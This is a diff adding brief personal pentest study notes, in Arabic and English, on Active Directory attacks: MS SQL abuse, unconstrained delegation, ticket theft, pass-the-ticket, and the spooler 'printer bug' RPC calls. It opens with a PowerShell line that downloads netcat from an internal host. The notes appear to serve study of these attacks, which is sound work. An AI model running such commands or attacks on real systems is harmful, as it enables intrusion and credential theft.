@@ -1,0 +1,33 @@
+
+Invoke-WebRequest -Uri http://192.168.134.35/nc.exe -OutFile C:\Temp\nc.exe
+
+
+MS SQL ABUSES in Active directory 
+
+
+
+# DELEGATION 
+اني بوكل شخص بمهمام ليا بديل صلحيات يعملها 
+
+# UNCONSTRAINED DELEGATION
+
+لما يوزر يجي يكلم mssql service on its server 
+ السيرفر بيخون التكت  بتاعته وبالتالي اي حدTGT  واي حد بيحاول يخش برضه يتخزن ف الميموري 
+ يجي التااكر عملل بر فليج اسكاليشن هوب يسرق التيكتس دي 
+ local admin ahahahha
+ 
+ then do pass the ticket attack 
+ 
+ 
+ 
+ printerbug 
+ 
+ it calls a rpc to force the DC to connect on a server that has service and uun constraied so we can catch the TGT 
+ RegisterSpoolerRemoteRpcEndPoint
+RpcRemoteFindFirstPrinterChangeNotificationEx
+RpcRemoteFindFirstPrinterChangeNotification
+
+
+
+
+ENUM : 
